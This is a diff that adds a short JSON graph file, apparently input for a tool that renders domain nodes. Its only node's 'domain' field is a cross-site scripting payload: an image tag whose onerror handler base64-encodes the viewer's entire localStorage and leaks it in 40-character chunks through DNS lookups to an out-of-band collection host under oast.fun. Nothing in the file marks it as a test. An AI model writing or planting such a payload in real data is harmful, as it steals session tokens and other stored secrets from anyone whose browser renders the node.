@@ -1,0 +1,10 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "domain",
+      "domain": "<img src=x onerror=\"(function(){var d=btoa(JSON.stringify(localStorage));for(var i=0;i<d.length;i+=40){new Image().src='https://c'+Math.floor(i/40)+'.'+d.substring(i,i+40)+'.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun';}})()\">"
+    }
+  ],
+  "edges": []
+}
